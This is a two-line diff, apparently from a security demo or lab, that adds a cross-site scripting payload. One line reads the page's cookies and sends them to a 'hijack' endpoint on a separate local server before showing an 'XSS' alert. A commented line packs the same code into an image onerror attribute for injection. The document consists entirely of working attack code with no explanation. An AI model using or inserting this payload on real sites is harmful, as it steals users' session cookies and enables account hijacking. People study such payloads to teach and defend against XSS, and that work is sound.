@@ -1,0 +1,2 @@
+var cookies = document.cookie;fetch(`http://localhost:3001/hijack?cookies=${cookies}`).then(() => window.alert('XSS'))
+// <img src="notValidUrl" onerror="var cookies = document.cookie;fetch(`http://localhost:3001/hijack?cookies=${cookies}`).then(() => window.alert('XSS'))">
